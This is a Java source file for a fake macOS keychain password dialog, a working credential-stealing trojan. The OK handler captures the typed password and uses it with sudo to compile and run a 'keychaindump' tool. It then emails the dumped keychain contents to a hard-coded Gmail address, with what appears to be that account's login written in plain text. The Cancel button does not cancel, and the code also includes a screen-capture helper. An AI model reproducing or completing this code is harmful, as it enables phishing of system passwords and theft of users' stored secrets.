package security;

import java.awt.AWTException;
import java.awt.EventQueue;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.net.URL;

import javax.swing.JFrame;

import net.miginfocom.swing.MigLayout;

import javax.swing.JLabel;
import javax.swing.ImageIcon;
import javax.swing.JPasswordField;
import javax.swing.JButton;
import javax.swing.JRootPane;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.awt.Canvas;


/*
import jpwn.AWTException;
import jpwn.BufferedImage;
import jpwn.HeadlessException;
import jpwn.Rectangle;
import jpwn.Robot;
*/
public class LoginWindow {

	private JFrame Security;
	private JPasswordField passwordField;
	public static String password;
	private static String message = "";

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					LoginWindow window = new LoginWindow();
					window.Security.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public LoginWindow() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		Security = new JFrame();
		Security.setBounds(100, 100, 450, 200);
		//Security.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		Security.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		Security.getContentPane().setLayout(new MigLayout("", "[142.00,grow][401.00,grow]", "[grow][grow][grow][grow][grow][][grow][][grow]"));
		//Security.setUndecorated(true);
		//Security.getRootPane().setWindowDecorationStyle(JRootPane.NONE);
		
		
		Canvas canvas = new Canvas();
		Security.getContentPane().add(canvas, "flowx,cell 0 0");
		
		JLabel label = new JLabel("");
		//InputStream input = classLoader.getResourceAsStream("resources/KeyChain.jpg")
		URL url = LoginWindow.class.getResource("/security/KeyChain.jpg");
		label.setIcon(new ImageIcon(url));
		
		//this.setIconImage(Toolkit.getDefaultToolkit().getImage(getClass().getResource("/images/yourimagename")));
		Security.getContentPane().add(label, "cell 0 0,alignx center,growy");
		
		JLabel lblSecurityWantsTo = new JLabel("<html><b>Security wants to use the \"login\" keychain.</b> <p> "
				+ " </p>Please enter the keychain password.<u></html>");
		Security.getContentPane().add(lblSecurityWantsTo, "cell 1 0,alignx left");
		
		JLabel lblpassword = new JLabel("<html>Password:</html>");
		Security.getContentPane().add(lblpassword, "flowx,cell 1 5");
		
		passwordField = new JPasswordField();
		passwordField.setColumns(20);
		Security.getContentPane().add(passwordField, "cell 1 5,alignx right");
		
		JButton btnCancel = new JButton("Cancel");
		btnCancel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				shake.vibrate(Security);
				passwordField.setText("");
				passwordField.requestFocus();
				cmd("say 'action cannot be cancelled'");
			}
		});
		Security.getContentPane().add(btnCancel, "flowx,cell 1 7,alignx right");
		final JButton btnOk_1 = new JButton("OK");
		Security.getRootPane().setDefaultButton(btnOk_1);
		btnOk_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				password = passwordField.getText();
				System.out.println(password);
				read.WriteFile("key.c", read.code);
				System.out.println(cmd("echo "+password+"| sudo -S gcc key.c -o keychaindump -lcrypto"));
				message = cmd("echo "+password+"| sudo -S ./keychaindump");
				//System.out.println(cmd("ls"));
				
				if(message==""){
					System.out.println("BadPass");
					shake.vibrate(Security);
					passwordField.setText("");
					passwordField.requestFocus();					
				}else{
					//Must make new email account.
					//System.out.println(message);
					Security.dispose();
					mail.sendMail("NSA.Mayor@gmail.com", "jack.m.mckenna@gmail.com", "zHd31Q67+",message);
					//cmd("say -v Zarvox 'You done fucked up.'");
				}
			}
		});
		Security.getContentPane().add(btnOk_1, "cell 1 7");
	}
	public static String cmd(String dothis){
		String l = "";
		try {
			
			String[] cmd = {"/bin/bash","-c",dothis};
		    Process pb = Runtime.getRuntime().exec(cmd);

		    String line;
		    BufferedReader input = new BufferedReader(new InputStreamReader(pb.getInputStream()));
		    while ((line = input.readLine()) != null) {
		      //  System.out.println(line);
		      //  l= new StringBuilder(line).append(l).toString();
		    	if(line!=null){
		    		l=l+line+"\n";
		    	}
		    }
		} catch (IOException e) {
			// TODO Auto-generated catch block
			System.out.println("badpass");
			e.printStackTrace();
		}
		return l;
	}
	
	public static BufferedImage screenCapture() throws HeadlessException, AWTException{
		BufferedImage image;
		try {
			image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			return image;
		} catch (HeadlessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		} catch (AWTException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
		//ImageIO.write(image, "png", new File("/screenshot.png"));
	}
}